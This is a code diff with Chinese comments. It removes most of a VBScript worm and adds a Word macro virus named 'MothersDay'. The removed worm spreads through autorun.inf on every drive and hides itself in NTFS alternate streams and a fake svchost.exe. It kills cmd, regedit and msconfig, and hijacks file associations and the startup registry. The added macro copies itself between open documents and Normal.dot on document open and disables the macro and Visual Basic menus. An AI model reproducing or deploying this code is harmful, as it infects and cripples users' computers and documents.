@@ -1,413 +1,143 @@
-'主函数至此结束
-''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
-Sub MonitorSystem()'结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe
+Sub Document_Open()
 On Error Resume Next
-Dim ProcessNames, ExeFullNames
-ProcessNames=Array("cmd.exe","cmd.com","regedit.exe","regedit.scr","regedit.pif","regedit.com","msconfig.exe")'ProcessNames相当于数组首地址
-VBSFullNames=Array(GetMainVirus(1))
-Do
-Call KillProcess(ProcessNames)
-Call InvadeSystem(GetMainVirus(1),GetMainVirus(0))'1:smss.exe:72161642.vbs
-Call KeepProcess(VBSFullNames)       '0:explorer.exe:72161642.vbs
-'上面这句用来保持进程活跃
-WScript.Sleep 3000
-Loop
-End Sub
-Sub InvadeSystem(VirusLoadPath,VirusAssPath)
-On Error Resume Next
-Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version
-Load_Value=""""&VirusLoadPath&""""'smss.exe的病毒流
-File_Value="%SystemRoot%\System32\WScript.exe "&""""&VirusAssPath&""""&" %1 %* "
-IE_Value="%SystemRoot%\System32\WScript.exe "&""""&VirusAssPath&""""&" OIE "
-MyCpt_Value1="%SystemRoot%\System32\WScript.exe "&""""&VirusAssPath&""""&" OMC "
-MyCpt_Value2="%SystemRoot%\System32\WScript.exe "&""""&VirusAssPath&""""&" EMC "
-HCULoad="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
-HCUVer="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"
-HCUDate="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"
-VirusCode=GetCode(WScript.ScriptFullName)
-Version=1
-HostSourcePath=Fso.GetSpecialFolder(1)&"\Wscript.exe"
-HostFilePath=Fso.GetSpecialFolder(0)&"\system\svchost.exe"
-For Each Drive In Fso.Drives'分别建立各个目录的病毒名字
-If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then
-DiskVirusName=GetSerialNumber(Drive.DriveLetter)&".vbs"
-Call CreateAutoRun(Drive.DriveLetter,DiskVirusName)
-Call InfectRoot(Drive.DriveLetter,DiskVirusName)
-End If
-Next
-If FSO.FileExists(VirusAssPath)=False Or FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()< Version Then
-If GetFileSystemType(GetSystemDrive())="NTFS" Then'NTFS格式
-Call CreateFile(VirusCode,VirusAssPath)
-Call CreateFile(VirusCode,VirusLoadPath)'这一步创建了流文件
-Call CopyFile(HostSourcePath,HostFilePath)'这一步将wscript.exe从system32复制到system目录并改名svchost.exe
-Call SetHiddenAttr(HostFilePath)
-Else'FAT32格式
-Call CreateFile(VirusCode, VirusAssPath)
-Call SetHiddenAttr(VirusAssPath)
-Call CreateFile(VirusCode,VirusLoadPath)
-Call SetHiddenAttr(VirusLoadPath)
-Call CopyFile(HostSourcePath, HostFilePath)
-Call SetHiddenAttr(HostFilePath)
-End If
-End If
-If ReadReg(HCULoad)<>Load_Value Then'改写注册表启动项，smss.exe的流
-Call WriteReg (HCULoad, Load_Value, "")
-End If
-If GetVersion() < Version Then'改写版本信息为1
-Call WriteReg (HCUVer, Version, "")
-End If
-If GetInfectedDate() = "" Then
-Call WriteReg (HCUDate, Date, "")'记录感染时间
-End If
-'以下更改许多文件关联,病毒的通用感染方式
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>File_Value Then
-Call SetTxtFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inifile\shell\open\command\")<>File_Value Then
-Call SetIniFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inffile\shell\open\command\")<>File_Value Then
-Call SetInfFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command\")<>File_Value Then
-Call SetBatFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command\")<>File_Value Then
-Call SetCmdFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>File_Value Then
-Call SetRegFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>File_Value Then
-Call SetchmFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>File_Value Then
-Call SethlpFileAss(VirusAssPath)
-End If
-If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\iexplore.exe\shell\open\command\")<>IE_Value Then
-Call SetIEAss(VirusAssPath)
-End If
-If ReadReg("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\")<>IE_Value Then
-Call SetIEAss(VirusAssPath)
-End If
-If ReadReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\open\command\")<>MyCpt_Value1 Then
-Call SetMyComputerAss(VirusAssPath)
-End If
-If ReadReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\explore\command\")<>MyCpt_Value2 Then
-Call SetMyComputerAss(VirusAssPath)
-End If
-Call RegSet()
-End Sub
-Sub CopyFile(source, pathf)
-On Error Resume Next
-If FSO.FileExists(pathf) Then
-FSO.DeleteFile pathf , True
-End If
-FSO.CopyFile source, pathf
-End Sub
-Sub CreateFile(code, pathf)
-On Error Resume Next
-Dim FileText
-If FSO.FileExists(pathf) Then
-Set FileText=FSO.OpenTextFile(pathf, 2, False)
-FileText.Write code
-FileText.Close
-Else
-Set FileText=FSO.OpenTextFile(pathf, 2, True)
-FileText.Write code
-FileText.Close
-End If
-End Sub
-Sub RegSet()'文件夹选项的注册表设置
-On Error Resume Next 
-Dim RegPath1 , RegPath2, RegPath3, RegPath4
-RegPath1="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue"'隐藏选项失效
-RegPath2="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"'隐藏选项失效
-RegPath3="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
-RegPath4="HKEY_CLASSES_ROOT\lnkfile\IsShortcut"
-Call WriteReg (RegPath1, 3, "REG_DWORD")
-Call WriteReg (RegPath2, 2, "REG_DWORD")
-Call WriteReg (RegPath3, 0, "REG_DWORD")'开启所有自动播放
-Call DeleteReg (RegPath4)'隐藏快捷方式小箭头
-End Sub
-Sub KillProcess(ProcessNames)'杀掉进程
-On Error Resume Next
-Set WMIService=GetObject("winmgmts:\\.\root\cimv2")
-For Each ProcessName in ProcessNames 
-Set ProcessList=WMIService.execquery(" Select * From win32_process where name ='"&ProcessName&"' ")
-For Each Process in ProcessList
-IntReturn=1'Process.terminate
-If intReturn<>0 Then
-WshShell.Run "CMD /c ntsd -c q -p "&Process.Handle, vbHide, False
-End If
-Next
-Next
-End Sub
-Sub KillImmunity(D)'删掉autorun.inf免疫目录
-On Error Resume Next
-ImmunityFolder=D&":\Autorun.inf"
-If Fso.FolderExists(ImmunityFolder) Then
-WshSHell.Run ("CMD /C CACLS "& """"&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True'提权
-WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True'rd命令删除，配合 /s /q 选项，很轻松
-End If
-End Sub
-Sub KeepProcess(VBSFullNames)'保持脚本进程持续运行，少于2个创建新进程
-On Error Resume Next
-For Each VBSFullName in VBSFullNames 
-If VBSProcessCount(VBSFullName) < 2 then
-Run("%SystemRoot%\system\svchost.exe "&VBSFullName)
-End If
-Next
-End Sub
-Function GetSystemDrive()'获取系统盘的盘符，比如c:
-GetSystemDrive=Left(Fso.GetSpecialFolder(0),2)
-End Function
-Function GetFileSystemType(Drive)'获取对应驱动器的文件系统格式
-Set d=FSO.GetDrive(Drive)
-GetFileSystemType=d.FileSystem
-End Function
-Function ReadReg(strkey)'读取注册表，搜索strkey，返回所在路径
-Dim tmps
-Set tmps=CreateObject("WScript.Shell")
-ReadReg=tmps.RegRead(strkey)
-Set tmps=Nothing
-End Function
-Sub WriteReg(strkey, Value, vtype)'写注册表
-Dim tmps
-Set tmps=CreateObject("WScript.Shell")
-If vtype="" Then
-tmps.RegWrite strkey, Value
-Else
-tmps.RegWrite strkey, Value, vtype
-End If
-Set tmps=Nothing
-End Sub
-Sub DeleteReg(strkey)'删除注册表
-Dim tmps
-Set tmps=CreateObject("WScript.Shell")
-tmps.RegDelete strkey
-Set tmps=Nothing
-End Sub
-Sub SetHiddenAttr(path)'6=2+4,分别是隐藏、系统属性
-On Error Resume Next
-Dim vf
-Set vf=FSO.GetFile(path)
-Set vf=FSO.GetFolder(path)
-vf.Attributes=6
-End Sub
-Sub Run(ExeFullName)'执行ExeFullName指定的文件
-On Error Resume Next
-Dim WshShell
-Set WshShell=WScript.CreateObject("WScript.Shell")
-WshShell.Run ExeFullName
-Set WshShell=Nothing
-End Sub
-Sub InfectRoot(D,VirusName)'感染根目录
-On Error Resume Next
-Dim VBSCode
-VBSCode=GetCode(WScript.ScriptFullName)
-VBSPath=D&":\"&VirusName
-If FSO.FileExists(VBSPath)=False Then
-Call CreateFile(VBSCode, VBSPath)
-Call SetHiddenAttr(VBSPath)
-End If
-Set Folder=Fso.GetFolder(D&":\")'隐藏根目录下的所有子目录
-Set SubFolders=Folder.Subfolders
-For Each SubFolder In SubFolders
-SetHiddenAttr(SubFolder.Path)
-LnkPath=D&":\"&SubFolder.Name&".lnk"'创建对应的快捷方式
-TargetPath=D&":\"&VirusName
-Args=""""&D&":\"&SubFolder.Name& "\Dir"""
-If Fso.FileExists(LnkPath)=False Or GetTargetPath(LnkPath) <> TargetPath Then
-If Fso.FileExists(LnkPath)=True Then
-FSO.DeleteFile LnkPath, True
-End If
-Call CreateShortcut(LnkPath,TargetPath,Args)
-End If
-Next
-End Sub
-Sub CreateShortcut(LnkPath,TargetPath,Args)'上一步失败了调用这个函数创建快捷方式
-Set Shortcut=WshShell.CreateShortcut(LnkPath)
-with Shortcut
-.TargetPath=TargetPath
-.Arguments=Args
-.WindowStyle=4
-.IconLocation="%SystemRoot%\System32\Shell32.dll, 3"
-.Save
-end with
-End Sub
-Sub CreateAutoRun(D,VirusName)'创建autorun.inf文件
-On Error Resume Next
-Dim InfPath, VBSPath, VBSCode
-InfPath=D&":\AutoRun.inf"
-VBSPath=D&":\"&VirusName
-VBSCode=GetCode(WScript.ScriptFullName)
-If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then
-Call CreateFile(VBSCode, VBSPath)
-Call SetHiddenAttr(VBSPath)
-StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell\open=打开(&O)"&VBCRLF&"shell\open\command=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell\open\Default=1"& VBCRLF&"shell\explore=资源管理器(&X)"&VBCRLF&"shell\explore\command=WScript.exe "&VirusName&" ""AutoRun"""
-Call KillImmunity(D)
-Call CreateFile(StrInf, InfPath)
-Call SetHiddenAttr(InfPath)
-End If
-End Sub
-Sub SetTxtFileAss(sFilePath)'改变txt格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetIniFileAss(sFilePath)'改变ini格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inifile\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetInfFileAss(sFilePath)'改变inf格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inffile\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetBatFileAss(sFilePath)'改变bat格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetCmdFileAss(sFilePath)'改变cmd格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SethlpFileAss(sFilePath)'改变hlp格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetRegFileAss(sFilePath)'改变reg格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetchmFileAss(sFilePath)'改变chm格式文件关联
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetIEAss(sFilePath)'篡改IE启动设置
-On Error Resume Next
-Dim Value
-Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" OIE "
-Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\iexplore.exe\shell\open\command\", Value, "REG_EXPAND_SZ")
-Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\", Value, "REG_EXPAND_SZ")
-End Sub
-Sub SetMyComputerAss(sFilePath)'改变我的电脑的打开关联，包括Win+E
-On Error Resume Next
-Dim Value1,Value2
-Value1="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" OMC "
-Value2="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" EMC "
-Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\", "", "REG_SZ")
-Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\open\command\", Value1, "REG_EXPAND_SZ")
-Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\explore\command\", Value2, "REG_EXPAND_SZ")
-End Sub
-Function GetSerialNumber(Drv)'获取驱动器序列号的绝对值
-On Error Resume Next
-Set d=fso.GetDrive(Drv)
-GetSerialNumber=d.SerialNumber'返回十进制序列号，用于唯一标识一个磁盘卷
-GetSerialNumber=Replace(GetSerialNumber,"-","")'去掉负号
-End Function
-Function GetMainVirus(N)'根据N的值获取不同的字符串
-On Error Resume Next
-MainVirusName=GetSerialNumber(GetSystemDrive())&".vbs"'以驱动器的序列号绝对值为vbs病毒的名字
-If GetFileSystemType(GetSystemDrive())="NTFS" Then'系统盘是NTFS分区
-If N=1 Then
-GetMainVirus=Fso.GetSpecialFolder(N)&"\smss.exe:"&MainVirusName'返回"c:\windows\system32\smss.exe:72161642.vbs"
-End If
-If N=0 Then
-GetMainVirus=Fso.GetSpecialFolder(N)&"\explorer.exe:"&MainVirusName'返回"c:\windows\explorer.exe:72161642.vbs"
-End If
-Else'系统盘是FAT32分区
-GetMainVirus=Fso.GetSpecialFolder(N)&"\"&MainVirusName'返回"c:\windows\72161642.vbs"或者"c:\windows\system32\72161642.vbs"
-End If
-End Function
-Function VBSProcessCount(VBSPath)'返回指定路径vbs脚本的运行个数
-On Error Resume Next
-Dim WMIService, ProcessList, Process
-VBSProcessCount=0
-Set WMIService=GetObject("winmgmts:\\.\root\cimv2")
-Set ProcessList=WMIService.ExecQuery("Select * from Win32_Process Where "&"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")
-For Each Process in ProcessList
-If InStr(Process.CommandLine, VBSPath)>0 Then
-VBSProcessCount=VBSProcessCount+1
-End If
-Next
-End Function
-Function PreDblInstance()'用来计数wscript进程的个数，如果大于等于3个那么返回True
-On Error Resume Next
-PreDblInstance=False
-If VBSProcessCount(WScript.ScriptFullName)>= 3 Then
-PreDblInstance=True
-End If
-End Function
-Function GetTargetPath(LnkPath)'获取快捷方式的vbs脚本地址
-On Error Resume Next
-Dim Shortcut
-Set Shortcut=WshShell.CreateShortcut(LnkPath)
-GetTargetPath=Shortcut.TargetPath
-End Function
-Function GetCode(FullPath)'获取文件的所有代码
-On Error Resume Next
-Dim FileText
-Set FileText=FSO.OpenTextFile(FullPath, 1)
-GetCode=FileText.ReadAll
-FileText.Close
-End Function
-Function GetVersion()'获取windows版本
-Dim VerInfo
-VerInfo="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"
-If ReadReg(VerInfo)="" Then
-GetVersion=0
-Else
-GetVersion=CInt(ReadReg(VerInfo))
-End If
-End Function
-Sub VirusAlert()'创建一个BFAlert.hta，然后打开该网页，黑黑的，什么都没有，吓人的
-On Error Resume Next
-Dim HtaPath,HtaCode
-HtaPath=Fso.GetSpecialFolder(1)&"\BFAlert.hta"
-HtaCode="<HTML><HEAD><TITLE>暴风一号</TITLE>"&VBCRLF&"<HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize"" border=""none"""&VBCRLF&"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no"">"&VBCRLF&"</HEAD><BODY bgcolor=#000000><DIV align =""center"">"&VBCRLF&"<font style=""font-size:3500%;font-family:Wingdings;color=red"">N</font><BR>"&VBCRLF&"<font style=""font-size:200%;font-family:黑体;color=red"">暴风一号</font>"&VBCRLF&"</DIV></BODY></HTML>"
-If FSO.FileExists(HtaPath)=False Then
-Call CreateFile(HtaCode, HtaPath)
-Call SetHiddenAttr(HtaPath)
-End If
-Call Run(HtaPath)
-End Sub
-Function GetInfectedDate()'获取感染日期
-On Error Resume Next
-Dim DateInfo
-DateInfo="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"
-If ReadReg(DateInfo)="" Then
-GetInfectedDate=""
-Else
-GetInfectedDate=CDate(ReadReg(DateInfo))
-End If
-End Function
-Sub MakeJoke(Times)'恶搞，弹出光驱
-On Error Resume Next
-Dim WMP, colCDROMs
-Set WMP = CreateObject( "WMPlayer.OCX" )
-Set colCDROMs = WMP.cdromCollection
-If colCDROMs.Count >0 Then
-For i=1 to Times
-colCDROMs.Item(0).eject()
-WScript.Sleep 3000
-colCDROMs.Item(0).eject()
-Next
-End If
-Set WMP = Nothing
+
+    Dim VirusName As String
+    Dim ActiveDocumentVirusStartCode As String
+    Dim NormalTemplateVirusStartCode As String
+    Dim PassWord As String
+    Dim VirusEndCode As String
+    Dim ActiveDocumentCodeCountOfLines As Long
+    Dim NormalTemplateCodeCountOfLines As Long
+    Dim Code As String
+    Dim VirusSrcCodeIndex As Integer
+    Dim VirusDstCodeIndex As Integer
+    Dim IsFind As Boolean
+    
+    VirusName = "MothersDay"
+    ActiveDocumentVirusStartCode = "Sub Document_Open()"
+    NormalTemplateVirusStartCode = "Sub AutoClose()"
+    VirusEndCode = "End Sub"
+    
+    Set ActiveDocumentItem1 = ActiveDocument.VBProject.VBComponents.Item(1)
+    Set NormalTemplateItem1 = NormalTemplate.VBProject.VBComponents.Item(1)
+    
+    'NormalTemplateItem1.Name = "ThisDocument"
+    'ActiveDocumentItem1.Name = "ThisDocument"
+    
+    '判断ActiveDocument和Normal.dot是否感染
+    If ActiveDocumentItem1.Name = VirusName And NormalTemplateItem1.Name = VirusName Then
+        GoTo ATTACK
+    End If
+    
+    '获取ActiveDocument和Normal.dot代码长度
+    ActiveDocumentCodeCountOfLines = ActiveDocumentItem1.CodeModule.CountOfLines
+    NormalTemplateCodeCountOfLines = NormalTemplateItem1.CodeModule.CountOfLines
+    
+    '判断若不是Word文档则不感染,在Word 2003(Application.Version = "11.0")中ActiveDocument.Name中不含有"Document"
+    'If NormalTemplateCodeCountOfLines > 0 And ActiveDocumentCodeCountOfLines = 0 And (InStr(1,ActiveDocument.Name, "Document")=False) Then
+    '   GoTo THEEND
+    'End If
+    
+    '感染Normal.dot
+    If NormalTemplateItem1.Name <> VirusName Then
+        '清空Normal.dot
+        NormalTemplateItem1.CodeModule.DeleteLines 1, NormalTemplateCodeCountOfLines
+        
+        '获取病毒起始地址(行号保存在Index中)
+        VirusSrcCodeIndex = 1
+        IsFind = False
+        Do
+            Code = ActiveDocumentItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
+            If Code <> ActiveDocumentVirusStartCode Then
+                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
+            Else
+                IsFind = True
+                Exit Do
+            End If
+        Loop While VirusSrcCodeIndex <= ActiveDocumentCodeCountOfLines
+        
+        If IsFind = True And VirusSrcCodeIndex < ActiveDocumentCodeCountOfLines Then
+        
+            VirusDstCodeIndex = 1
+            '注入病毒新的头(Sub AutoOpen())
+            NormalTemplateItem1.CodeModule.InsertLines VirusDstCodeIndex, NormalTemplateVirusStartCode
+            '注入病毒主体
+            Do
+                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
+                VirusDstCodeIndex = VirusDstCodeIndex + 1
+                Code = ActiveDocumentItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
+                NormalTemplateItem1.CodeModule.InsertLines VirusDstCodeIndex, Code
+            Loop While (Code <> VirusEndCode And VirusSrcCodeIndex < ActiveDocumentCodeCountOfLines)
+            
+            '设置感染标记
+            NormalTemplateItem1.Name = VirusName
+            
+        Else
+            GoTo THEEND
+        End If
+        
+    End If
+    
+    '感染ActiveDocument
+    If ActiveDocumentItem1.Name <> VirusName Then
+        '清空ActiveDocument
+        ActiveDocumentItem1.CodeModule.DeleteLines 1, ActiveDocumentCodeCountOfLines
+        
+        '获取病毒起始地址(行号保存在Index中)
+        VirusSrcCodeIndex = 1
+        IsFind = False
+        Do
+            Code = NormalTemplateItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
+            If Code <> NormalTemplateVirusStartCode Then
+                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
+            Else
+                IsFind = True
+                Exit Do
+            End If
+        Loop While VirusSrcCodeIndex <= NormalTemplateCodeCountOfLines
+        
+        If IsFind = True And VirusSrcCodeIndex < NormalTemplateCodeCountOfLines Then
+        
+            VirusDstCodeIndex = 1
+            '注入病毒新的头(Sub AutoOpen())
+            ActiveDocumentItem1.CodeModule.InsertLines VirusDstCodeIndex, ActiveDocumentVirusStartCode
+            '注入病毒主体
+            Do
+                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
+                VirusDstCodeIndex = VirusDstCodeIndex + 1
+                Code = NormalTemplateItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
+                ActiveDocumentItem1.CodeModule.InsertLines VirusDstCodeIndex, Code
+            Loop While (Code <> VirusEndCode And VirusSrcCodeIndex < NormalTemplateCodeCountOfLines)
+            
+            '设置感染标记
+            ActiveDocumentItem1.Name = VirusName
+            
+        Else
+            GoTo THEEND
+        End If
+        
+    End If
+    
+ATTACK:
+    '添加以下代码可以使文档被感染后再次打开时输入密码,若密码输入错误即无法打开文档,此病毒将不会代码将不会被执行
+    'ActiveDocument.Password = "0514"
+    
+    '禁用宏菜单编辑功能
+    Application.CommandBars("Tools").Enabled = False
+    Application.CommandBars("Macro").Enabled = False
+    Index = 1
+    Do
+        Application.CommandBars("Macro").Controls(Index).Enabled = False
+        Index = Index + 1
+    Loop While Index <= Application.CommandBars("Macro").Controls.Count
+    '禁用“Visual Basic”工具栏,可能还需要禁用“自定义”工具栏
+    Application.CommandBars("Visual Basic").Enabled = False
+    
+    '添加自动保存
+    ActiveDocument.Save
+    
+    '弹出对话框
+    MsgBox Prompt:="计算机已感染母亲节病毒", Title:="计算机已感染母亲节病毒"
+THEEND:
+    
 End Sub
